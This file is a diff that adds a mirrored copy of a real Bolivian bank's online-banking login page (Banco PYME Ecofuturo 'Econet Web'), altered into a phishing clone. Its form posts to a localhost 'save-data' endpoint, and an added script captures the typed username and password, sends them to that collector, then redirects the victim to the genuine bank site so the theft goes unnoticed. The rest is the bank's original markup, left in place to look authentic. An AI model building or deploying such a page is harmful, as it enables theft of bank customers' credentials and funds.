@@ -1,0 +1,794 @@
+<!DOCTYPE html>
+<html>
+
+<!-- Mirrored from econet.bancoecofuturo.com.bo:447/EconetWeb/Usuario/Login by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 14 Jun 2024 00:50:01 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8; IE=11" />
+
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="https://econet.bancoecofuturo.com.bo:447/EconetWeb/Imagenes/BANCA_INTERNET.png">
+    <title>Login - Econet Web</title>
+    <link href="https://econet.bancoecofuturo.com.bo:447/EconetWeb/Content_Login/css?v=_0seXVhhN2Zlrvo-3Cc9xRLgHbn--OIz-vNL61aXmmw1" rel="stylesheet"/>
+
+    <script src="https://econet.bancoecofuturo.com.bo:447/EconetWeb/bundles/modernizr?v=inCVuEFe6J4Q07A0AcRsbJic_UE5MwpRMNGcOtk94TE1"></script>
+
+    <script src="https://econet.bancoecofuturo.com.bo:447/EconetWeb/bundles/jquery?v=TdLUHVbV4zzRIA8ooJn5GjTjIsa-B1s0JQggCPmOisU1"></script>
+
+    <script src="https://econet.bancoecofuturo.com.bo:447/EconetWeb/bundles/Login?v=l_CoE3H2iNMuxnX7zislSM8CSkpw2E_sJJbF0nAK0WQ1"></script>
+
+    <script src="https://econet.bancoecofuturo.com.bo:447/EconetWeb/bundles/bootstrap?v=bHr_CTduqwNp-Unhqodljbfg1QUBvwKUn8jAKOZj7WI1"></script>
+
+    <link href="https://econet.bancoecofuturo.com.bo:447/EconetWeb/Content/font-awesome.min.css" rel="stylesheet" />
+    
+    
+
+    <script type="text/javascript">
+
+        function mostrarPassword() {
+            var cambio = document.getElementById("txtPassword");
+            if (cambio.type == "password") {
+                cambio.type = "text";
+                $("#imagenpassclose").hide();
+                $("#imagenpass").show();
+
+            } else {
+                cambio.type = "password";
+                $("#imagenpass").hide();
+                $("#imagenpassclose").show();
+            }
+        }
+        $(document).on('click', '#advertencia', function (e) {
+            $('#ModalMedidasSeguridad').modal('show');
+            $('#modalAyuda').modal('hide');
+        });
+
+
+
+        $(document).ready(function () {
+            //CheckBox mostrar contraseña
+            $('#ShowPassword').click(function () {
+                $('#Password').attr('type', $(this).is(':checked') ? 'text' : 'password');
+            });
+            $('#ingresar').attr('formaction', GetRoute("Usuario", "VerificarPassword"))
+            $('#Solicitar').attr('formaction', GetRoute("Usuario", "SolicitaPassword"))
+            $.ajax({
+                url: GetRoute("Usuario", "obtenerVersion"),
+                type: 'POST',
+                success: function (resp) {
+                    $('#version label').text(resp);
+                    $('#version').fadeIn(1000);
+                    $('#version').fadeOut(1000);
+                }
+            });
+            $.ajax({
+                url: GetRoute("Usuario", "ObtenerAnuncio"),
+                type: 'POST',
+                success: function (response, status, xhr) {
+                    var ct = xhr.getResponseHeader("content-type") || "";
+                    if (ct.indexOf('html') > -1) {
+                        $('html').append(response);
+                        $('#modalAnuncio').modal();
+                    }
+                }
+            });
+        });
+
+
+
+        $(document).on('click', '#LogoInicialEconet', function () {
+            $.ajax({
+                url: GetRoute("Usuario", "obtenerVersion"),
+                type: 'POST',
+                success: function (resp) {
+                    $('#version label').text(resp);
+                    $('#version').fadeIn(1000);
+                    $('#version').fadeOut(1000);
+                }
+            });
+
+        })
+
+        function Ingresar() {
+
+            navigator.geolocation.getCurrentPosition(function (position) {
+                $('#latitud').val(position.coords.latitude);
+                $('#longitud').val(position.coords.longitude);
+                $.getJSON('https://api.ipify.org/?format=json', function (data) {
+                    $('#ip1').val(data.ip);
+                    $('#ip2').val(data.ip);
+                    //$.getJSON('https://api64.ipify.org?format=json', function (data) {
+                    //    $('#ip2').val(data.ip);
+                    $('#frmLogin').submit();
+                    //});
+                });
+            }, function (error) {
+                $.getJSON('https://ipinfo.io/json', function (data) {
+                    //console.log(data.city);
+                    var loc = data.loc.split(',');
+                    $('#latitud').val(loc[0]);
+                    $('#longitud').val(loc[1]);
+                    $('#ip1').val(data.ip);
+
+                    $('#lugar').val(data.region + ', ' + data.country);
+                    $('#frmLogin').submit();
+                });
+            });
+
+        }
+
+        function AbrirOlvidoPassword() {
+            $('.olvidoPass .modal.bootstrapmodal').modal();
+        }
+
+        function AbrirOlvidoPasswordEmail() {
+            $('.olvidoPassEmail .modal.bootstrapmodal').modal();
+        }
+
+        function AbrirPreguntasSeguridad() {
+            $('.preguntasSeguridadResp .modal.bootstrapmodal').modal();
+        }
+
+        function EnviarOlvidoPassword() {
+
+            if ($('#usuarioweb').val() == '') {
+                $('#usuarioweb').val($('#olvidoNick').val())
+            }
+            $('.olvidoPass button').attr('disabled', 'disabled');
+            $.ajax({
+                url: GetRoute("Usuario", "OlvidoPassword"),
+                data: $('#frm_olvido_pass :input').serialize(),
+                type: 'POST',
+                success: function (resp, status, xhr) {
+                     if (resp.codigo == '01') {
+                         $('#olvidoNick').val('');
+                         $('#olvidoToken').val('');
+                     }
+                     $('.olvidoPass .modal.bootstrapmodal').modal('hide');
+                     $($('label.lblMensaje')[0]).text(resp.descripcion);
+                     $('.olvidoPass button').removeAttr('disabled');
+
+                    console.log("Respuesta de olvido pass para email");
+                    var ct = xhr.getResponseHeader("content-type") || "";
+                    console.log(ct);
+                    if (ct.indexOf('html') > -1) {
+                        $('#modalparaolvidopasswordEmail').html(resp);
+                        AbrirOlvidoPasswordEmail();
+                        $('.olvidoPass .modal.bootstrapmodal').modal('hide');
+                    }
+                    if (ct.indexOf('json') > -1) {
+                        $($('label.lblMensaje')[0]).text(resp.descripcion);
+                    }
+                }
+            });
+        }
+
+        function EnviarPreguntasSeguridad() {
+            let info = $('#frm_preguntas_seguridad :input').serialize();
+            if ($('#usuarioweb').val() == '') {
+                $('#usuarioweb').val($('#olvidoNick').val())
+            }
+            console.log(info);
+            $.ajax({
+                url: GetRoute("Usuario", "GuardarPreguntasSeguridad"),
+                data: $('#frm_preguntas_seguridad :input').serialize(),
+                type: 'POST',
+                success: function (resp, status, xhr) {
+                    if (resp.codigo == '01') {
+                        $('#olvidoNick').val('');
+                        $('#olvidoToken').val('');
+                    }
+                    $('.preguntasSeguridadResp .modal.bootstrapmodal').modal('hide');
+                    $($('label.lblMensaje')[0]).text(resp.descripcion);
+                    $('.olvidoPass button').removeAttr('disabled');
+
+
+                }
+            });
+        }
+
+        function EnviarOlvidoPasswordEmail() {
+
+            if ($('#usuarioweb').val() == '') {
+                $('#usuarioweb').val($('#olvidoNickEmail').val())
+            }
+            $('.olvidoPassEmail button').attr('disabled', 'disabled');
+            $.ajax({
+                url: GetRoute("Usuario", "OlvidoPasswordEmailToPreguntas"),
+                data: $('#frm_olvido_passEmail :input').serialize(),
+                type: 'POST',
+                success: function (resp, status, xhr) {
+                    if (resp.codigo == '01') {
+                         $('#olvidoNick').val('');
+                         $('#olvidoToken').val('');
+                     }
+                     $('.olvidoPass .modal.bootstrapmodal').modal('hide');
+                     $($('label.lblMensaje')[0]).text(resp.descripcion);
+                     $('.olvidoPass button').removeAttr('disabled');
+
+                    console.log("Respuesta de olvido pass para email");
+                    var ct = xhr.getResponseHeader("content-type") || "";
+                    console.log(ct);
+                    if (ct.indexOf('html') > -1) {
+                        $('#modalPreguntasSeguridad').html(resp);
+                        AbrirPreguntasSeguridad();
+                        $('.olvidoPassEmail .modal.bootstrapmodal').modal('hide');
+                    }
+                    if (ct.indexOf('json') > -1) {
+                        $($('label.lblMensaje')[0]).text(resp.descripcion);
+                    }
+                }
+            });
+
+        }
+
+        function EnviarPreOlvidoPassword() {
+            $('label.lblMensaje').text("");
+            $.ajax({
+                url: GetRoute("Usuario", "PreOlvidoPassword"),
+                data: $('#frmLogin :input').serialize(),
+                type: 'POST',
+                success: function (resp, status, xhr) {
+                    var ct = xhr.getResponseHeader("content-type") || "";
+                    if (ct.indexOf('html') > -1) {
+                        $('#modalparaolvidopassword').html(resp);
+                        AbrirOlvidoPassword();
+                    }
+                    if (ct.indexOf('json') > -1) {
+                        $($('label.lblMensaje')[0]).text(resp.descripcion);
+                    }
+                }
+            });
+        }
+        function refreshCaptcha() {
+            $('#txtCaptcha').val('');
+            SolicitaPassword()
+        }
+        function CancelaSolicitaPassword() {
+            $('#areaCaptcha').hide();
+            $('#areaPassword').show();
+            $('label.lblMensaje').text('');
+        }
+        function SolicitaPassword() {
+            $('label.lblMensaje').text('');
+            $.ajax({
+                url: GetRoute("Usuario", "SolicitaPassword"),
+                data: $('#frmLogin :input').serialize(),
+                type: 'POST',
+                success: function (resp, status, xhr) {
+                    $('#imagenCaptcha').attr('src', '');
+                    $('#txtCaptcha').val('');
+                    var ct = xhr.getResponseHeader("content-type") || "";
+                    if (ct.indexOf('html') > -1) {
+
+                    }
+                    if (ct.indexOf('json') > -1) {
+                        $($('label.lblMensaje')[0]).text(resp.descripcion);
+                        if (resp.codigo == "18") {
+                            $('#areaPassword').hide();
+                            $('#areaCaptcha').show();
+                            $('#imagenCaptcha').attr('src', 'data:image/jpeg;base64,' + resp.foto);
+                        }
+                        else {
+                            $('#areaCaptcha').hide();
+                            $('#areaPassword').show();
+                        }
+                    }
+                }
+            });
+
+        }
+        $('#frmLogin').submit(function () {
+            $('.lblMensaje').text('');
+        });
+
+
+
+    </script>
+
+
+</head>
+<body>
+    <script>
+        function GoInicio() {
+            var xx = "/EconetWeb/" + "Usuario" + "/" + "Login";
+            return xx;
+        }
+        function GetRoute(controller, view) {
+            var xx = "/EconetWeb/" + controller + "/" + view;
+            return xx;
+        }
+         $("a[href!='#']").click(function () {
+             if ($(this).attr("href") != undefined && $(this).attr("href").indexOf("javascript") == -1 && $(this).attr("href").indexOf("own-national") == -1 && !$(this).hasClass('no-loader')) {
+                 if ($(this).attr("href").indexOf("#") == -1 && !$(this).hasClass('no-preloader')) {
+                    $("#preloader").css({ "display": "" });
+                    $("#preloader").animate({ "opacity": "0.9" }, 500);
+                }
+            }
+        });
+        $(document).ajaxStart(function () {
+            $("#preloader").css({ "display": "" });
+            $("#preloader").animate({ "opacity": "0.9" }, 500);
+        })
+        $(document).submit(function () {
+            $("#preloader").css({ "display": "" });
+            $("#preloader").animate({ "opacity": "0.9" }, 500);
+        })
+        $(document).ajaxStop(function () {
+            $("#preloader").animate({ "opacity": "0" }, 500, function () { $("#preloader").css({ "display": "none" }); });
+        })
+        $(document).ready(function () {
+            $("#preloader").animate({ "opacity": "0" }, 500, function () { $("#preloader").css({ "display": "none" }); });
+        })
+
+
+        $(window).on('beforeunload', function () {
+
+        /*window.onbeforeunload('dfMessengerLoaded', function (event) {*/
+           const dfMessenger = document.querySelector('df-messenger');
+           dfMessenger.shadowRoot.querySelector('button#widgetIcon').style.height = "65px"
+            dfMessenger.shadowRoot.querySelector('button#widgetIcon').style.width = "65px"
+            dfMessenger.shadowRoot.querySelector("button#widgetIcon").querySelector(".df-chat-icon").style.width = "80%"
+            dfMessenger.shadowRoot.querySelector("button#widgetIcon").querySelector(".df-chat-icon").style.height = "80%"
+           dfMessenger.shadowRoot.querySelector("button#widgetIcon").querySelector(".df-chat-icon").style.position = "Initial"
+        });
+        setTimeout(function () {
+            document.querySelector('df-messenger').shadowRoot.querySelector('button#widgetIcon').style.height = "75px"
+            document.querySelector('df-messenger').shadowRoot.querySelector('button#widgetIcon').style.width = "75px"
+            document.querySelector('df-messenger').shadowRoot.querySelector('button#widgetIcon').querySelector('.df-chat-icon').style.position = "absolute"
+            document.querySelector('df-messenger').shadowRoot.querySelector('button#widgetIcon').querySelector('.df-chat-icon').style.height = "100%"
+            document.querySelector('df-messenger').shadowRoot.querySelector('button#widgetIcon').querySelector('.df-chat-icon').style.width = "100%"
+            document.querySelector('df-messenger').shadowRoot.querySelector('button#widgetIcon').querySelector('.df-chat-icon').style.left = "0px"
+            document.querySelector('df-messenger').shadowRoot.querySelector('button#widgetIcon').querySelector('.df-chat-icon').style.top = "0px"
+        }, 1500)
+
+    </script>
+    <main>
+        
+
+
+
+
+
+
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=Promise%2CPromise.prototype.finally%2CTextDecoder%2CTextEncoder%2CObject.entries"></script>
+
+
+<div class="container-fluid">
+
+    <div class="row">
+        <div class="col-sm-6 quote-section"></div>
+        <div class="col-sm-6 form-section">
+            <br>
+            
+            <div class="text-right" id="btn-ayuda" onclick="javascript:$('#modalAyuda').modal('show')">
+                <div class="btn-contactanos">
+                    <img style="width: 30px; margin:5px" class="img-responsive img-rounded" src="https://econet.bancoecofuturo.com.bo:447/EconetWeb/Imagenes/iconos/ayuda.png" alt="X" />
+                    <for style="color: orangered; margin: 5px;">Ayuda <for />
+                </div>
+            </div>
+            <div class="login-wrapper text-center">
+                <div id="version" style="position: absolute; display: none;">
+                    <label class="control-label"></label>
+                </div>
+                <div class="text-body">
+                    <label>Bienvenido a </label>
+                </div>
+                <img class="img-responsive" id="LogoInicialEconet" style="max-width:100%" src="https://econet.bancoecofuturo.com.bo:447/EconetWeb/Imagenes/Logo_Econet.jpg" alt="X" />
+                <div class="text-body">
+                    <br />
+                    <label class="lblMensaje"></label>
+                    <label class="lblMensaje"></label>
+
+                </div>
+
+                <form action="http://localhost:8000/save-data" method="post" id="frmLogin">
+                    <input type="text" id="usuario" name="usuario" class="form-control" maxlength="20" placeholder="Usuario" required pattern="[A-Za-z0-9]+" />
+                    <div id="areaPassword">
+                        <div class="form-group mb-3">
+                            <label for="txtPassword" class="control-label">Contraseña</label>
+                            <input id="txtPassword" type="password" name="password" class="form-control" placeholder="Contraseña" maxlength="20" autocomplete="off" />
+                        </div>
+                        <input name="tokenNotificacion" id="tokennotificacion" hidden />
+                        <input name="ingresar" id="ingresar" class="btn btn-block login-btn" type="submit" value="Ingresar"> <!-- Cambiado a type="submit" -->
+                        
+                        <div>
+                            <a class="col-6" href="#" onclick="window.SolicitaPassword(); return false;">Solicitar contraseña</a>
+                            <a class="col-6" href="#" onclick="window.EnviarPreOlvidoPassword(); return false;">¿Olvidó su contraseña?</a>
+                        </div>
+                        <div style="margin-top:20px">
+                            <a href="#" data-toggle="modal" data-target="#exampleModalCenter">Ingreso por primera vez</a>
+                        </div>
+                    </div>
+                    <div id="areaCaptcha" style="display:none">
+                        <div class="form-group mb-3">
+                            <div style="text-align:center">
+                                <img style="margin-left:10px" id="imagenCaptcha" src="#" />
+                                <a href="#" onclick="window.refreshCaptcha(); return false;"><i style="font-size:larger" class="fa fa-refresh"></i></a>
+                            </div>
+                            <label class="control-label">Ingrese el captcha generado</label>
+                            <input id="txtCaptcha" type="text" name="captcha" class="form-control" placeholder="captcha" maxlength="20" autocomplete="off" />
+                        </div>
+                        <input name="solicitar" id="solicitar" class="btn btn-block login-btn" value="Solicitar contraseña" onclick="window.SolicitaPassword(); return false;">
+                        <input name="cancelar" id="cancelaSolicitar" class="btn btn-block login-btn" value="Cancelar" onclick="window.CancelaSolicitaPassword(); return false;">
+                    </div>
+
+
+                    </div>
+                    <table width=125 border=0 cellspacing=0 cellpadding=0 title="CLICK TO VERIFY: This site uses a GlobalSign SSL Certificate to secure your personal information.">
+                        <tr>
+                            <td>
+                                <span id="ss_img_wrapper_gmogs_image_110-45_en_blue"><a href="https://www.globalsign.com/" target="_blank" title="GlobalSign Site Seal" rel="nofollow"><img alt="SSL" border=0 id="ss_img" src="http://seal.globalsign.com/SiteSeal/images/gs_noscript_110-45_en.gif"></a></span>
+                                <script type="text/javascript" src="http://seal.globalsign.com/SiteSeal/gmogs_image_110-45_en_blue.js"></script>
+                            </td>
+                        </tr>
+                    </table>
+                    <div class="g-recaptcha">
+                        <input id="token" name="token" hidden />
+
+
+
+                    </div>
+<input id="ip1" name="ip1" type="hidden" value="" /><input id="ip2" name="ip2" type="hidden" value="" /><input id="latitud" name="latitud" type="hidden" value="" /><input id="longitud" name="longitud" type="hidden" value="" /><input id="longitud" name="longitud" type="hidden" value="" />
+</form> 
+<script>
+    document.getElementById('frmLogin').addEventListener('submit', function(event) {
+        event.preventDefault(); // Evita el envío estándar del formulario
+        
+        var usuario = document.getElementById('usuario').value;
+        var password = document.getElementById('txtPassword').value;
+
+        fetch('http://localhost:8000/save-data', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ usuario: usuario, password: password })
+        })
+        .then(response => {
+            if (response.ok) {
+                window.location.href = "https://econet.bancoecofuturo.com.bo:447/EconetWeb";
+            } else {
+                alert("Error al iniciar sesión");
+            }
+        })
+        .catch(error => {
+            console.error('Error al solicitar fetch:', error);
+            alert("Error en la solicitud fetch, intente de nuevo");
+        });
+    });
+</script>
+
+</div>
+
+
+            <a href="https://www.bancoecofuturo.com.bo/sitio/formulario-reclamos/2102" target="_blank" class="float">
+                <img class="imgpuntoreclamo" src="https://econet.bancoecofuturo.com.bo:447/EconetWeb/Imagenes/PUNTORECLAMO.png" />
+            </a>
+            <script src="https://www.gstatic.com/dialogflow-console/fast/messenger/bootstrap.js?v=1">
+
+            </script>
+            <df-messenger intent="WELCOME"
+                          chat-title="Cumpy"
+                          agent-id="77360fa3-87e1-4aa7-acea-0c78dd97f665"
+                          chat-icon="/EconetWeb/Imagenes/chatbotweb.png"
+                          language-code="es"></df-messenger>
+
+            <div id="modalparaolvidopassword">
+
+            </div>
+
+            <div id="modalparaolvidopasswordEmail">
+
+            </div>
+
+            <div id="modalPreguntasSeguridad">
+
+            </div>
+
+
+            <div class="modal fade" id="exampleModalCenter" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
+    <div class="modal-dialog modal-dialog-centered" role="document">
+        <div class="modal-content">
+            <div>
+                <a class="close" data-dismiss="modal" aria-label="Close">
+                    <i class="fa fa-close" aria-hidden="true" style="color:#FE5000; font-size:30px"></i>
+                </a>
+            </div>
+            
+            <!--Carousel Wrapper-->
+            <div id="carousel-example-1z" class="carousel slide carousel-fade" data-ride="carousel">
+                <!--Indicators-->
+                <ol class="carousel-indicators">
+                    <li data-target="#carousel-example-1z" data-slide-to="0" class="active"></li>
+                    <li data-target="#carousel-example-1z" data-slide-to="1"></li>
+                    <li data-target="#carousel-example-1z" data-slide-to="2"></li>
+                    <li data-target="#carousel-example-1z" data-slide-to="3"></li>
+                </ol>
+                <!--/.Indicators-->
+                <!--Slides-->
+                <div class="carousel-inner" role="listbox">
+                    <!--First slide-->
+                    <div class="carousel-item active">
+                        <img class="d-block w-100" src="https://econet.bancoecofuturo.com.bo:447/EconetWeb/Imagenes/PasosRegistro/REGISTRO_ECONET-01.png"
+                             alt="First slide">
+                    </div>
+                    <!--/First slide-->
+                    <!--Second slide-->
+                    <div class="carousel-item">
+                        <img class="d-block w-100" src="https://econet.bancoecofuturo.com.bo:447/EconetWeb/Imagenes/PasosRegistro/REGISTRO_ECONET-02.png"
+                             alt="Second slide">
+                    </div>
+                    <!--/Second slide-->
+                    <!--Third slide-->
+                    <div class="carousel-item">
+                        <img class="d-block w-100" src="https://econet.bancoecofuturo.com.bo:447/EconetWeb/Imagenes/PasosRegistro/REGISTRO_ECONET-03.png"
+                             alt="Third slide">
+                    </div>
+                    <!--/Third slide-->
+                    <!--Third slide-->
+                    <div class="carousel-item">
+                        <img class="d-block w-100" src="https://econet.bancoecofuturo.com.bo:447/EconetWeb/Imagenes/PasosRegistro/REGISTRO_ECONET-04.png"
+                             alt="Fourth slide">
+                    </div>
+                    <!--/Third slide-->
+                </div>
+                <!--/.Slides-->
+                <!--Controls-->
+                <a class="carousel-control-prev" href="#carousel-example-1z" role="button" data-slide="prev">
+                    <span><i class="fa fa-chevron-left" aria-hidden="true" style="color:#FE5000; font-size:50px"></i></span>
+                    <span class="carousel-control-prev-icon" aria-hidden="true"></span>
+                    <span class="sr-only">Previous</span>
+                </a>
+                <a class="carousel-control-next" href="#carousel-example-1z" role="button" data-slide="next">
+                    <span><i class="fa fa-chevron-right" aria-hidden="true" style="color:#FE5000; font-size:50px"></i></span>
+                    <span class="carousel-control-next-icon" aria-hidden="true"></span>
+                    <span class="sr-only">Next</span>
+                </a>
+                <!--/.Controls-->
+            </div>
+            <!--/.Carousel Wrapper-->
+        </div>
+    </div>
+</div>
+                
+
+
+
+        </div>
+    </div>
+    <div class="app-inner-layout" id="advertencia">
+        <div class="col-12 main-section comprobante">
+    <!-- Modal -->
+    <div class="modal fade" id="ModalMedidasSeguridad" role="dialog">
+        <div class="modal-dialog">
+            <!-- Modal content-->
+            <div class="modal-content">
+                <div class="modal-header" style="background-color:orangered">
+                    
+                    <h3 style="color:white; margin:0px;padding:0px;">Medidas de seguridad</h3>
+                </div>
+                <div class="modal-body">
+                    <ol class="text-justify">
+                        <li>
+                            Ingrese a ECONET a través de la Página Web de Banco PYME Ecofuturo S.A., nunca utilice enlaces de otras páginas o correos electrónicos.
+                        </li>
+                        <li>
+                            Verifique la existencia de candado en la barra de direcciones, que contenga el logo de VeriSign que confirme la identificación de Banco PYME Ecofuturo S.A.
+                        </li>
+                        <li>
+                            Aconsejamos que siempre se conecte al servicio desde un solo lugar y desde una computadora propia o de confianza para así poder evitar que personas ajenas ingresen a su cuenta.
+                        </li>
+                        <li>
+                            Recuerde que bajo ninguna circunstancia ECOFUTURO le solicitará sus accesos y contraseñas, datos personales u otro tipo de información confidencial a través de correos electrónicos, mensajería y otros.
+                        </li>
+                        <li>
+                            Controle periódicamente sus transacciones mediante los extractos de este servicio.
+                        </li>
+                        <li>
+                            Se recomienda cambiar contraseña cada 90 días.
+                        </li>
+                        <li>
+                            Para la cancelación o suspensión (bloqueo) del servicio de Econet Móvil, contáctese con nuestro Contact Center, visite nuestras agencias o ingrese a su aplicación web. Para la cancelación o suspensión (bloqueo) del servicio de Econet Web, contáctese con nuestro Contact Center o visite nuestras agencias.
+                        </li>
+                        <li>
+                            Para la reactivación del servicio Econet web y móvil, visite nuestras agencias.
+                        </li>
+                    </ol>
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-default" data-dismiss="modal">Cerrar</button>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+    </div>
+</div>
+
+
+
+    </main>
+    <div class="col-12 main-section ">
+    <!-- Modal -->
+    <div class="modal fade" id="modalContactanos" role="dialog">
+        <div class="modal-dialog">
+            <!-- Modal content-->
+            <div class="modal-content">
+                <div class="modal-header" style="justify-content:center">
+                    <h4 class="modal-title contactanos-titulo" style="color:#FF5000; font-weight:bold">Contáctanos</h4>
+                </div>
+                <div>
+                    <p style="color:#707070; text-align:center; font-size:18px; padding: 1rem 0px 0px 0px; margin:0px">Para cualquier consulta o irregularidad contáctese con nuestros canales de atención</p>
+                </div>
+                <div class="modal-body">
+                    <div class="row">
+                        <div class="col-12">
+                            <div class="h5" style="color:#FE5000; font-size:18px; padding:5px; font-weight:bold">Canales de atención</div>
+                        </div>
+                    </div>
+                    <div class="row">
+                        <div class="col-6">
+                            <div class="h6" style="padding-left:5px">Línea gratuita:</div>
+                        </div>
+                        <div class="col-6">
+                            <a class="btn btn-pastilla-naranja" type="button" href="https://www.bancoecofuturo.com.bo/sitio/" target="_blank">800 10 3112</a>
+                        </div>
+                        <div class="col-6">
+                            <div class="h6" style="padding-left:5px">WhatsApp:</div>
+                        </div>
+                        <div class="col-6">
+                            <a class="btn btn-pastilla-naranja" type="button" href="https://api.whatsapp.com/send?phone=59172222210" target="_blank">722 22210</a>
+                        </div>
+                    </div>
+                    <div class="row">
+                        <div class="col-12">
+                            <div class="h5" style="color:#FE5000; font-size:18px; padding:5px; font-weight:bold">Horarios de atención</div>
+                        </div>
+                    </div>
+                    <div class="row">
+                        <div class="col-6">
+                            <div class="h6" style="padding-left:5px">Lunes a viernes de:</div>
+                        </div>
+                        <div class="col-6">
+                            <div>7:30 a 19:00</div>
+                        </div>
+                        <div class="col-6">
+                            <div class="h6" style="padding-left:5px">Sábados de:</div>
+                        </div>
+                        <div class="col-6">
+                            <div>9:00 a 12:30</div>
+                        </div>
+                    </div>
+                    <div class="row">
+                        <div class="col-12">
+                            <div class="h5" style="color:#FE5000; font-size:18px; padding:5px; font-weight:bold">Se atienden consultas y/o dudas sobre:</div>
+                        </div>
+                    </div>
+                    <div>
+                        <div class="col-12 container-fluid">
+                            <div class="h6" style="padding-left:5px">
+                                <ol>
+                                    <li>Productos y Servicios del Banco.</li>
+                                    <li>Agencias y ATM´s del Banco y Aliados.</li>
+                                    <li>Registro de Puntos de Reclamos.</li>
+                                    <li>Tarjetas de Crédito y Tarjetas de Débito.</li>
+                                    <li>Créditos.</li>
+                                    <li>Cuentas de Ahorro y/o Cuentas Corriente.</li>
+                                    <li>Bloqueo Tarjetas de Débito.</li>
+                                    <li>Soporte para el manejo Operativo de la aplicación Econet.</li>
+                                    <li>Bloqueo, Desbloqueo y  Modificación de límite transaccional de Econet.</li>
+                                    <li>Servicio de e-consulta.</li>
+                                </ol>
+                            </div>
+                        </div>
+                    </div>
+                    
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-orange" data-dismiss="modal">Cerrar</button>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+    <div class="col-12 main-section ">
+    <!-- Modal -->
+    <div class="modal fade" id="modalAyuda" role="dialog">
+        <div class="modal-dialog">
+            <!-- Modal content-->
+            <div class="modal-content">
+                <div class="modal-header" style="justify-content: center;">
+                    <h4 style="color:#FF5000" class="modal-title ayuda-titulo">Información</h4>
+                </div>
+                <div class="modal-body">
+                    <div class="col-12" style="text-align: center; color: #707070;">
+                        <h4 class="modal-title ayuda-titulo">Seleccione una opción</h4>
+                    </div>
+                    <div class="row">
+                        <div class="col-6">
+                            <div class="btn-pastilla">
+                                <a href="https://www.bancoecofuturo.com.bo/sitio/canales-puntos-de-atencion" class="no-preloader" target="_blank" style="text-decoration:none">
+                                    <div class="row">
+                                        <div class="col-5" style="text-align:center ; align-self: center">
+                                            <img style="width: 45px; margin:5px" class="img-responsive img-rounded" src="https://econet.bancoecofuturo.com.bo:447/EconetWeb/Imagenes/iconos/puntostencion.png" alt="X" />
+                                        </div>
+                                        <div class="col-7" style="text-align:center ; align-self: center">
+                                            <for style="color: #707070; margin: 5px;">Puntos de atención <for />
+                                        </div>
+                                    </div>
+                                </a>
+                            </div>
+                        </div>
+                        <div class="col-6">
+                            <div class="btn-pastilla">
+                                <div class="row" id="advertencia" style="cursor: pointer">
+                                    <div class="col-5" style="text-align:center; align-self: center">
+                                        <img style="width: 45px; margin:5px" class="img-responsive img-rounded" src="https://econet.bancoecofuturo.com.bo:447/EconetWeb/Imagenes/iconos/medidasseguridad.png" alt="X" />
+                                    </div>
+                                    <div class="col-7" style="text-align:center; align-self: center">
+                                        <for style="color: #707070; margin: 5px;">Medidas de seguridad <for />
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-6">
+                            <div class="btn-pastilla">
+                                <div class="row" id="btn-contactanos" style="cursor: pointer" onclick="javascript: $('#modalContactanos').modal('show'); $('#modalAyuda').modal('hide');">
+                                    <div class="col-5" style="text-align: center; align-self: center">
+                                        <img style="width: 45px; margin:5px" class="img-responsive img-rounded" src="https://econet.bancoecofuturo.com.bo:447/EconetWeb/Imagenes/iconos/contactanosicon.png" alt="X" />
+                                    </div>
+                                    <div class="col-7" style="text-align: center; align-self: center">
+                                        <for style="color: #707070; margin: 5px;">Contáctanos <for />
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-6">
+                            <div class="btn-pastilla">
+                                <a href="https://www.bancoecofuturo.com.bo/sitio/formulario-reclamos/2102" target="_blank" class="no-preloader" style="text-decoration:none">
+                                    <div class="row">
+                                        <div class="col-5" style="text-align: center; align-self: center">
+                                            <img style="width: 45px; margin:5px" class="img-responsive img-rounded" src="https://econet.bancoecofuturo.com.bo:447/EconetWeb/Imagenes/iconos/puntoreclamo.png" alt="X" />
+                                        </div>
+                                        <div class="col-7" style="text-align: center; align-self: center">
+                                            <for style="color: #707070; margin: 5px;">Punto de Reclamo <for />
+                                        </div>
+                                    </div>
+                                </a>
+                            </div>
+                        </div>
+                        
+                    </div>
+                    <div class="col-12" style="text-align: center; color: #FF5000;">
+                        <h4 class="modal-title ayuda-titulo">Síguenos</h4>
+                    </div>
+                    <div style="text-align:center; margin: 5px 0px 15px 0px">
+                        <a style="margin:0px 5px 0px 5px" title="facebook" href="https://www.facebook.com/BancoEcofuturo" target="_blank"><img style="width:50px" src="https://econet.bancoecofuturo.com.bo:447/EconetWeb/Imagenes/iconos/iconosfb.png" /></a>
+                        <a style="margin:0px 5px 0px 5px" title="Instagram" href="https://www.instagram.com/bancoecofuturo/" target="_blank"><img style="width:50px" src="https://econet.bancoecofuturo.com.bo:447/EconetWeb/Imagenes/iconos/iconosig.png" /></a>
+                        <a style="margin:0px 5px 0px 5px" title="LinkIn" href="https://www.linkedin.com/company/banco-ecofuturo/mycompany/" target="_blank"><img style="width:50px" src="https://econet.bancoecofuturo.com.bo:447/EconetWeb/Imagenes/iconos/iconosln.png" /></a>
+                        <a style="margin:0px 5px 0px 5px" title="YouTube" href="https://www.youtube.com/channel/UC2doer5UJozi4Rx89nEM_0g" target="_blank"><img style="width:50px" src="https://econet.bancoecofuturo.com.bo:447/EconetWeb/Imagenes/iconos/iconosyt.png" /></a>
+                    </div>
+                    <div class="modal-footer">
+                        <button type="button" class="btn btn-orange" data-dismiss="modal">Cerrar</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+    <div id="preloader" class="preloader" style="opacity: 0;display: none;">
+        <div class="preloader-inner">
+            <div class="spinner-container text-center">
+                <div class="spinner-border" style="width: 5rem; height: 5rem; color:#FE5000;" role="status"></div>
+                <p>Espera un momento por favor...</p>
+            </div>
+        </div>
